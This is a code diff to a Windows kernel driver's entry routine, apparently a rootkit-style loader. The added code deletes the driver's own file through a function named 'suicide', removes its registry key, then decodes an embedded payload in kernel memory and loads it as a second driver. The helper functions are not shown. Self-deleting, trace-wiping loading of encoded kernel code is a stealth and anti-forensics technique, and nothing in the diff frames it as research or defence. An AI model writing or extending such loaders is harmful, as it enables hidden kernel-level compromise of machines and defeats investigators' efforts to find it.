@@ -2,16 +2,15 @@
 #include "Loader.h"
 #include "data.h"
 
+NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
+    PLDR_DATA_TABLE_ENTRY ldr = (PLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;
+    suicide(&ldr->FullDllName);
+    DeleteRegistryKey(RegistryPath);
 
-
-NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath){
-
-    
     PUCHAR pMem = NULL;
-    pMem = ExAllocatePool(NonPagedPool, sizeof(rawData));
-    RtlCopyMemory(pMem, rawData, sizeof(rawData));
-    
-    
+    pMem = ExAllocatePool(NonPagedPool, sizeof(sysData));
+    RtlCopyMemory(pMem, sysData, sizeof(sysData));
+    docode(pMem, sizeof(sysData));
     loadDriver(pMem);
 
     ExFreePool(pMem);
